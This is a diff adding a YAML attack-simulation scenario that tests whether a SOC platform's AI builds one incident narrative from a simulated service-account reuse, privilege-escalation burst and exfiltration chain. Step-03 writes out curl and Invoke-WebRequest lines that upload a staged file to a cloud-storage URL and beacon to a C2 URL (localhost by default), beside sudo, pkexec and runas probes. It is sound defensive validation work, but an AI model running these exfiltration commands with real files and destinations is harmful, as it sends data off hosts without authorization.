@@ -1,0 +1,250 @@
+scenario_id: SIM-EDR-018
+name: "AI SOC Summarization Accuracy & Latency — 72-Minute Identity-to-Exfil Narrative Reconstruction"
+version: "1.0"
+status: active
+
+plane: EDR
+detection_types:
+  - ABIOC
+  - XQL
+  - Correlation
+
+uc_ref: UCS-IR-06
+tc_ref: TC-IR-12
+tc_refs:
+  - TC-IR-12
+  - TC-IR-05
+  - TC-CITH-07
+pov_scenario_id: POV-SC-018
+uc_name: "Incident Response"
+tc_name: "Demonstrate incident synthesis generates executive summary from correlated alert data"
+
+# ── MITRE ATT&CK Mapping ────────────────────────────────────────────────────
+# Headline tactic is TA0010 (Exfiltration) with two real exfil variants
+# (T1567.002 cloud storage + T1041 C2 channel). The identity-driven lead-in
+# (T1078) and scripted escalation (T1059.001) set up the chain the AI must
+# reconstruct into one narrative.
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1567.002"
+mitre_technique_name: "Exfiltration to Cloud Storage"
+additional_techniques:
+  - technique: "T1041"
+    name: "Exfiltration Over C2 Channel"
+  - technique: "T1078"
+    name: "Valid Accounts"
+  - technique: "T1059.001"
+    name: "Command and Scripting Interpreter: PowerShell"
+
+threat_report: "Unit 42 — Inside the Modern SOC: The 72-Minute Race"
+threat_report_url: "https://unit42.paloaltonetworks.com/soc-72-minute-race/"
+
+execution_identity:
+  default: svc-backup
+  options:
+    - svc-backup
+    - www-data
+    - root
+
+push_supported: true
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+# F7 (AI Triage & Summarization). The KPI is not "did a signature fire" — it is
+# "did Cortex XSIAM AI reconstruct the whole identity->endpoint->exfil chain into
+# ONE narrative naming initial access, privilege escalation, and the exfil
+# destination, AND do it inside the 72-minute breakout window the intrusion took".
+validation_methodology: "AI Triage & Narrative Summarization Accuracy"
+methodology_family: "F7"
+primary_kpi: "AI Summary Completeness"
+threshold:
+  kpi: "AI Summary Completeness"
+  op: "≥"
+  value: 100
+  unit: "%"
+success_criteria: |
+  Correlation story (F7): the identity -> endpoint -> exfil chain — signals across
+  2 to 10 data sources per the Unit 42 report — is reconstructed by Cortex XSIAM AI
+  into ONE narrative summary that explicitly names all three phases and the exfil
+  destination:
+    1. Initial access  — valid service-account reuse from an anomalous endpoint
+       context (T1078), surfaced by the interactive-shell-lineage ABIOC.
+    2. Privilege escalation — scripted-interpreter escalation burst (T1059.001),
+       surfaced by the escalation-diversity ABIOC.
+    3. Exfiltration — cloud-storage destination (T1567.002) plus C2 beacon
+       (T1041), surfaced by the NDR exfil XQL.
+  F7 PASS = the AI summary is COMPLETE and CORRECT (all three phases + the
+  cloud-storage exfil destination named) AND produced inside the 72-minute
+  (4320-second) breakout window. The breakout-timing XQL proves the whole chain
+  compressed inside that window so latency is measured, not assumed. Correlation
+  CR-EDR-0018 raises exactly one incident_id spanning >= 2 planes (ENDPOINT + NDR).
+moat_tier: "MOAT"
+
+# ── Correlation-terminal (F2/F7) fields ─────────────────────────────────────
+# The run is stitch-terminal: step-04 asserts the single incident_id. The
+# stitching key is the identity principal (identity-driven intrusion), the window
+# is the 72-minute breakout window, and the incident must span EDR + NDR.
+correlation_window_seconds: 4320
+required_planes_in_incident:
+  - EDR
+  - NDR
+stitching_key: user_principal
+
+# ── Causality Group Owner anchor ────────────────────────────────────────────
+# The intrusion begins with a valid service account (svc-backup) driven
+# interactively from a remote session, so the CGO that OWNS the chain is the
+# launching daemon (sshd) running the reused service-account identity — NOT the
+# synthetic cortexsim-agent beacon. The interactive shell, the scripted
+# escalation burst, and the exfil process all descend from that sshd->shell root
+# via process_lineage, and the exfil bridges to the NGFW session via an
+# endpoint_network_stitch edge — collapsing the star-off-the-agent layout into
+# ONE connected identity->endpoint->network spine the AI summarizer narrates.
+cgo_anchor:
+  image_name: "sshd"
+  primary_username: "svc-backup"
+
+external_tools: []
+
+# ── Steps ───────────────────────────────────────────────────────────────────
+# Order is the kill chain: identity reuse -> scripted escalation -> exfil ->
+# stitch/AI-summary assertion. Every command is NON-DESTRUCTIVE and runs under
+# the identity harness on Linux; the PowerShell technique (T1059.001) is
+# approximated with pwsh-when-present-else-bash so the endpoint telemetry shape
+# is produced without a Windows target. Bulk exfil is a 4 KB SAFE-MODE marker,
+# not the "hundreds of GB" the report describes.
+steps:
+  - id: step-01
+    name: "Initial access — valid service-account reused from an interactive endpoint context"
+    command: "bash -ic 'id; whoami; echo cortexsim-edr-018-valid-account-initial-access' || true"
+    identity: svc-backup
+    mitre_technique: "T1078"
+    # ROOT of the chain — no causality block; links from the sshd CGO. The
+    # ABIOC keys on causality_actor_process_image_name in (sshd/su/runuser/...),
+    # so the sshd->interactive-shell lineage IS the initial-access anchor.
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "A valid service account whose learned baseline is scheduled, non-interactive automation is driven interactively — auto-tuned ABIOC fires on the identity-driven initial-access deviation, anchored to the service-account causality chain. This is phase 1 the AI narrative must name."
+        ttp_ref: "TTP-2026-0131"
+        detection_id: "abioc-ai-soc-72-valid-account-reuse-from-anomalous-endpoint-context"
+
+  - id: step-02
+    name: "Privilege escalation — scripted-interpreter escalation burst under the compromised account"
+    command: |
+      for c in 'sudo -n true' 'id' 'pkexec --version'; do sh -c "$c" >/dev/null 2>&1 || true; done
+      command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'Write-Output cortexsim-edr-018-scripted-escalation' 2>/dev/null || echo cortexsim-edr-018-scripted-escalation-bash-fallback
+    identity: svc-backup
+    mitre_technique: "T1059.001"
+    # The escalation burst is spawned by the interactive shell from step-01 — a
+    # real parent->child exec, so process_lineage keeps the connected spine. The
+    # burst is cross-platform (Linux sudo/pkexec/pwsh; the Windows equivalent is a
+    # PowerShell/runas escalation sequence), so exercise it on both.
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "powershell -NoProfile -Command \"whoami /priv; runas /user:Administrator cmd; Start-Process powershell -Verb RunAs -ArgumentList '-Command whoami /groups'\""
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "The compromised account runs a fan-out of distinct escalation utilities (sudo/pkexec/PowerShell-style) exceeding its learned process diversity — auto-tuned ABIOC fires on the escalation-diversity deviation, anchored to the interactive shell that spawned it. This is phase 2 (privilege escalation) the AI narrative must name."
+        ttp_ref: "TTP-2026-0131"
+        detection_id: "abioc-ai-soc-72-rapid-privilege-escalation-after-valid-account-compromise"
+
+  - id: step-03
+    name: "Exfiltration — SAFE-MODE marker staged to cloud storage plus a C2 beacon"
+    command: |
+      head -c 4096 /dev/zero | tr '\0' 'A' > /tmp/.cortexsim_edr018_stage
+      curl -s --max-time 5 -T /tmp/.cortexsim_edr018_stage "${CLOUD_STORAGE_URL:-http://127.0.0.1/cortexsim-exfil}" >/dev/null 2>&1 || true
+      curl -s --max-time 5 "${C2_URL:-http://127.0.0.1/beacon}" -o /dev/null 2>&1 || true
+      echo cortexsim-edr-018-exfil-cloud-storage-and-c2-complete
+    identity: svc-backup
+    mitre_technique: "T1567.002"
+    # The exfil curl is spawned by the escalation shell (endpoint), and its
+    # outbound session is the NGFW/NDR half — this is exactly where the endpoint
+    # process joins the firewall session, so endpoint_network_stitch is the pivot
+    # that bridges the EDR chain to the NDR plane the incident must span. Exfil to
+    # cloud storage is cross-platform (curl / Invoke-WebRequest -Method Put).
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "powershell -NoProfile -Command \"Invoke-WebRequest -Uri $env:CLOUD_STORAGE_URL -Method Put -InFile $env:TEMP\\stage.bin; Invoke-WebRequest -Uri $env:C2_URL -UseBasicParsing | Out-Null\""
+    causality:
+      parent_step: step-02
+      pivot: endpoint_network_stitch
+    expected_detections:
+      - plane: NDR
+        type: XQL
+        description: "NGFW/network telemetry shows outbound egress carrying the SAFE-MODE marker to a cloud-storage destination (and the C2 beacon) within the breakout window — this names phase 3 (the exfil destination) the AI narrative must include."
+        ttp_ref: "TTP-2026-0131"
+        detection_id: "xql-ai-soc-72-exfiltration-to-cloud-storage-from-compromised-host"
+        verification_xql: |
+          dataset = pan_ngfw_traffic
+          | filter dst_host contains "cortexsim-exfil" or dst_host contains "s3.amazonaws.com" or dst_host contains ".s3."
+          | comp sum(bytes_sent) as egress_bytes by source_ip, dst_host
+          | filter egress_bytes >= 1
+      - plane: EDR
+        type: XQL
+        description: "Breakout-window timing metric — confirms the whole identity->endpoint->exfil chain compressed inside 4320 seconds (72 minutes) so the F7 latency KPI is measured, not assumed."
+        ttp_ref: "TTP-2026-0131"
+        detection_id: "xql-ai-soc-72-breakout-window-timing-from-identity-to-exfil"
+        verification_xql: |
+          dataset = xdr_data
+          | filter actor_effective_username = "svc-backup"
+          | comp min(_time) as first_signal, max(_time) as last_signal by agent_hostname
+          | alter breakout_seconds = last_signal - first_signal
+          | filter breakout_seconds <= 4320
+
+  - id: step-04
+    name: "Stitch + AI-summary assertion — one incident_id, complete narrative, inside 72 minutes"
+    command: |
+      echo '[EDR-018] Stitch verification — polling for the single stitched incident';
+      sleep "${CORTEXSIM_STITCH_WAIT_SECONDS:-90}"
+      echo '[*] CR-EDR-0018 should fuse identity + endpoint + exfil signals into one incident_id'
+      echo '[*] Cortex XSIAM AI narrative must name: (1) valid-account initial access,'
+      echo '    (2) scripted privilege escalation, (3) cloud-storage exfil destination'
+      echo '[*] F7 pass = summary complete + correct AND produced within 4320s (72 min)'
+      echo cortexsim-edr-018-cr-edr-0018-stitched-narrative-incident
+    identity: root
+    mitre_technique: "T1041"
+    # TERMINAL correlation — the AI summarizer converges the identity + endpoint +
+    # network signals on the same host+principal into ONE incident. shared_entity
+    # from step-03 terminates the connected spine at the correlation node.
+    platforms: ["linux"]
+    causality:
+      parent_step: step-03
+      pivot: shared_entity
+    expected_detections:
+      - plane: ANALYTICS
+        type: Correlation
+        description: "Correlation fuses the two behavioral-deviation ABIOCs and the exfil XQL on the same host+principal within the 72-minute window into a single identity-to-exfiltration incident_id spanning ENDPOINT + NDR — the one incident Cortex XSIAM AI narrates for the F7 summarization KPI."
+        ttp_ref: "TTP-2026-0131"
+        detection_id: "CR-EDR-0018"
+        verification_xql: |
+          // F7 verifier — one incident, >= 2 planes, whole chain inside 72 min
+          dataset = xdr_data
+          | filter _time > to_timestamp(current_time() - 4320)
+          | comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count, min(_time) as t0, max(_time) as t1 by actor_effective_username
+          | alter breakout_seconds = t1 - t0
+          | filter plane_count >= 2 and incident_count = 1 and breakout_seconds <= 4320
+
+cleanup:
+  commands:
+    - "rm -f /tmp/.cortexsim_edr018_stage"
+    - "echo cortexsim-edr-018-cleanup-complete"
+
+# ── Provenance ──────────────────────────────────────────────────────────────
+author: "Henry Reed"
+created: "2026-07-24"
+last_updated: "2026-07-24"
+tags:
+  - edr
+  - ai-soc-triage
+  - ai-summarization
+  - f7-ai-triage
+  - correlation-terminal
+  - identity-driven
+  - exfiltration
+  - breakout-window
+  - moat
